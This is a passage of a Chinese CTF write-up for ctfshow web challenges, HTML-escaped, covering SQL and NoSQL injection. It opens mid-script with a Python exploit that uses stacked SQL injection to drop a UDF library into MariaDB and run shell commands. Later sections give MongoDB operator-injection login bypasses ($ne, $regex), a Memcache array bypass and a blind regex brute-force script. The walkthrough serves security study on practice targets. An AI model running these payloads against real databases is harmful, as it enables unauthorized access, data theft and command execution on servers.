for i in range(0,21510, 5000):
    end = i + 5000
    payload.append(udf[i:end])

p = dict(zip(text, payload))

for t in text:
    url = base_url+&amp;quot;?id=&amp;#39;;select unhex(&amp;#39;&amp;#123;&amp;#125;&amp;#39;) into dumpfile &amp;#39;/usr/lib/mariadb/plugin/&amp;#123;&amp;#125;.txt&amp;#39;--+&amp;amp;page=1&amp;amp;limit=10&amp;quot;.format(p[t], t) #UDF提权一般配合dumpfile 而不是outfile
    r = requests.get(url)
    print(r.status_code)

next_url = base_url+&amp;quot;?id=&amp;#39;;select concat(load_file(&amp;#39;/usr/lib/mariadb/plugin/a.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/b.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/c.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/d.txt&amp;#39;),load_file(&amp;#39;/usr/lib/mariadb/plugin/e.txt&amp;#39;)) into dumpfile &amp;#39;/usr/lib/mariadb/plugin/udf.so&amp;#39;-- +&amp;amp;page=1&amp;amp;limit=10&amp;quot; #将各个txt文件合并到udf.so
rn = requests.get(next_url)

uaf_url=base_url+&amp;quot;?id=&amp;#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &amp;#39;udf.so&amp;#39;;--+&amp;quot;#创建udf函数
r=requests.get(uaf_url)
nn_url = base_url+&amp;quot;?id=&amp;#39;;select sys_eval(&amp;#39;cat /flag.*&amp;#39;);-- +&amp;amp;page=1&amp;amp;limit=10&amp;quot;#执行命令并查看
rnn = requests.get(nn_url)
print(rnn.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web249&#34;&gt;&lt;a href=&#34;#web249&#34; class=&#34;headerlink&#34; title=&#34;web249&#34;&gt;&lt;/a&gt;web249&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //无
  $user = $memcache-&amp;gt;get($id);


返回逻辑
  //无过滤
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt; 从 &lt;strong&gt;Memcache 缓存服务器&lt;/strong&gt; 中，取出键名为 &lt;code&gt;$id&lt;/code&gt; 的缓存数据，并赋值给 &lt;code&gt;$user&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;Memcache::get&lt;/code&gt;：从服务端检回一个元素&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;如果服务端之前有以key作为key存储的元素，&lt;code&gt;Memcache::get()&lt;/code&gt; 方法此时返回之前存储的值&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;可以给 &lt;code&gt;Memcache::get()&lt;/code&gt; 方法传递一个数组（多个key）来获取一个数组的元素值，返回的数组仅仅包含从服务端查找到的 key-value 对&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;id&lt;/code&gt; 为数字类型，使用数组绕过&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;/api?id[]=flag
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904162617834.png&#34; alt=&#34;image-20250904162617834&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web250&#34;&gt;&lt;a href=&#34;#web250&#34; class=&#34;headerlink&#34; title=&#34;web250&#34;&gt;&lt;/a&gt;web250&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;1.&lt;code&gt;$query = new MongoDB\Driver\Query($data);&lt;/code&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;MongoDB\Driver\Query&lt;/code&gt; 是 MongoDB 驱动提供的查询对象。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$data&lt;/code&gt; 是一个数组（通常类似 &lt;code&gt;[&amp;#39;id&amp;#39; =&amp;gt; 123]&lt;/code&gt; 或 &lt;code&gt;[&amp;#39;username&amp;#39; =&amp;gt; &amp;#39;abc&amp;#39;]&lt;/code&gt;），表示查询条件。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$query = new MongoDB\Driver\Query($data);&lt;/code&gt; 的意思是把查询条件封装成一个 MongoDB 查询对象，方便后面执行。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.&lt;code&gt;$cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;$manager&lt;/code&gt; 是 MongoDB 的连接管理对象，类似数据库连接。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)&lt;/code&gt; 表示在 ctfshow 数据库的 ctfshow_user 集合里执行这个查询。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;返回值 &lt;code&gt;$cursor&lt;/code&gt; 是一个 游标对象（Cursor），表示查询结果集合。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;-&amp;gt;toArray()&lt;/code&gt; 把游标里的所有结果转换成一个 PHP 数组，方便访问。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;MongoDB 查询条件的操作符&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;1️⃣ &lt;strong&gt;比较操作符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$gt&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于 &lt;code&gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $gt: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄大于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$lt&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于 &lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $lt: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄小于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$gte&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;大于等于 &lt;code&gt;&amp;gt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $gte: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≥ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$lte&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;小于等于 &lt;code&gt;&amp;lt;=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $lte: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≤ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$ne&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;不等于 &lt;code&gt;!=&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $ne: 18 &amp;#125; &amp;#125;&lt;/code&gt; → 年龄不等于 18&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$in&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;在指定数组内&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $in: [18,19,20] &amp;#125; &amp;#125;&lt;/code&gt; → 年龄是 18、19、20 中的一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$nin&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;不在指定数组内&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $nin: [18,19,20] &amp;#125; &amp;#125;&lt;/code&gt; → 年龄不是 18、19、20 中的任何一个&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$all&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;包含数组中所有元素&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; tags: &amp;#123; $all: [&amp;quot;red&amp;quot;,&amp;quot;big&amp;quot;] &amp;#125; &amp;#125;&lt;/code&gt; → tags 必须同时有 “red” 和 “big”&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2️⃣ 逻辑操作符&lt;/strong&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;符号&lt;/th&gt;
&lt;th&gt;含义&lt;/th&gt;
&lt;th&gt;示例&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$or&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;或条件&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; $or: [ &amp;#123;age:18&amp;#125;, &amp;#123;age:20&amp;#125; ] &amp;#125;&lt;/code&gt; → 年龄是 18 或 20&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;$not&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;取反&amp;#x2F;反匹配&lt;/td&gt;
&lt;td&gt;&lt;code&gt;&amp;#123; age: &amp;#123; $not: &amp;#123; $gt: 18 &amp;#125; &amp;#125; &amp;#125;&lt;/code&gt; → 年龄 ≤ 18&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;3️⃣ 模糊查询（正则）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用 &lt;code&gt;$regex&lt;/code&gt; 做类似 SQL &lt;code&gt;LIKE&lt;/code&gt; 的模糊匹配：&lt;/li&gt;
&lt;/ul&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;db.customer.find(&amp;#123; name: &amp;#123; $regex: &amp;#39;.*s.*&amp;#39; &amp;#125; &amp;#125;)
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;意思是：查询名字里 &lt;strong&gt;包含字母 s&lt;/strong&gt; 的用户。&lt;/li&gt;
&lt;li&gt;&lt;code&gt;.*&lt;/code&gt; 表示任意字符任意长度。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;4️⃣ 范围查询示例&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;javascript&#34;&gt;&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$gte&amp;quot;: 2, &amp;quot;$lte&amp;quot;: 21 &amp;#125; &amp;#125; // 2 &amp;lt;= age &amp;lt;= 21
&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$ne&amp;quot;: 23 &amp;#125; &amp;#125;             // age != 23
&amp;#123; &amp;quot;age&amp;quot;: &amp;#123; &amp;quot;$lt&amp;quot;: 23 &amp;#125; &amp;#125;             // age &amp;lt; 23
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查看源代码找到post请求&lt;/strong&gt;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904170052785.png&#34; alt=&#34;image-20250904170052785&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web251&#34;&gt;&lt;a href=&#34;#web251&#34; class=&#34;headerlink&#34; title=&#34;web251&#34;&gt;&lt;/a&gt;web251&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  $query = new MongoDB\Driver\Query($data);
  $cursor = $manager-&amp;gt;executeQuery(&amp;#39;ctfshow.ctfshow_user&amp;#39;, $query)-&amp;gt;toArray();


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$ne]=1
username[$ne]=admin&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904171914214.png&#34; alt=&#34;image-20250904171914214&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web252&#34;&gt;&lt;a href=&#34;#web252&#34; class=&#34;headerlink&#34; title=&#34;web252&#34;&gt;&lt;/a&gt;web252&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //sql
  db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()&lt;/code&gt; ：在 &lt;code&gt;ctfshow_user&lt;/code&gt; 表里查找 用户名和密码同时匹配的用户，并把结果以漂亮格式打印出来&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;#GET
/api/index.php

#POST
username[$ne]=1&amp;amp;password[$regex]=ctfshow&amp;#123;
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904171324967.png&#34; alt=&#34;image-20250904171324967&#34; style=&#34;zoom:25%;&#34; /&gt;

&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id=&#34;web253&#34;&gt;&lt;a href=&#34;#web253&#34; class=&#34;headerlink&#34; title=&#34;web253&#34;&gt;&lt;/a&gt;web253&lt;/h1&gt;&lt;pre&gt;&lt;code class=&#34;sql&#34;&gt;nosql注入


sql语句
  //sql
  db.ctfshow_user.find(&amp;#123;username:&amp;#39;$username&amp;#39;,password:&amp;#39;$password&amp;#39;&amp;#125;).pretty()


返回逻辑
  //无过滤
  if(count($cursor)&amp;gt;0)&amp;#123;
    $ret[&amp;#39;msg&amp;#39;]=&amp;#39;登陆成功&amp;#39;;
    array_push($ret[&amp;#39;data&amp;#39;], $flag);
  &amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;经过测试，&lt;code&gt;username&lt;/code&gt; 为 &lt;code&gt;flag&lt;/code&gt; ，但是页面不会回显数据，采用脚本盲注&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;php&#34;&gt;username[$regex]=flag&amp;amp;password[$ne]=1
&lt;/code&gt;&lt;/pre&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904173050917.png&#34; alt=&#34;image-20250904173050917&#34; style=&#34;zoom:25%;&#34; /&gt;



&lt;p&gt;&amp;nbsp;&lt;/p&gt;
&lt;img data-src=&#34;\images\article_images\image-20250904173225468.png&#34; alt=&#34;image-20250904173225468&#34; style=&#34;zoom:80%;&#34; /&gt;

&lt;pre&gt;&lt;code class=&#34;python&#34;&gt;import requests
import string
import time

url = &amp;#39;http://a9f047cc-a3f5-4146-a5ef-8c652481cd86.challenge.ctf.show/api/&amp;#39;
dic = string.digits + string.ascii_lowercase + &amp;#39;&amp;#123;&amp;#125;-_&amp;#39;
out = &amp;#39;ctfshow&amp;#123;&amp;#39;

for j in range(9, 50):
    for k in dic:
        payload = &amp;#123;&amp;#39;username[$ne]&amp;#39;: &amp;#39;1&amp;#39;, &amp;#39;password[$regex]&amp;#39;: f&amp;#39;^&amp;#123;out+k&amp;#125;&amp;#39;&amp;#125;
        try:
            re = requests.post(url, data=payload)
            if &amp;quot;\\u767b\\u9646\\u6210\\u529f&amp;quot; in re.text:  # 反斜杠进行转义
                out += k
                print(out)
                break
        except requests.exceptions.RequestException as e:
            print(f&amp;quot;请求失败: &amp;#123;e&amp;#125;&amp;quot;)
        time.sleep(0.5)  # 添加请求间隔
&lt;/code&gt;&lt;/pre&gt;
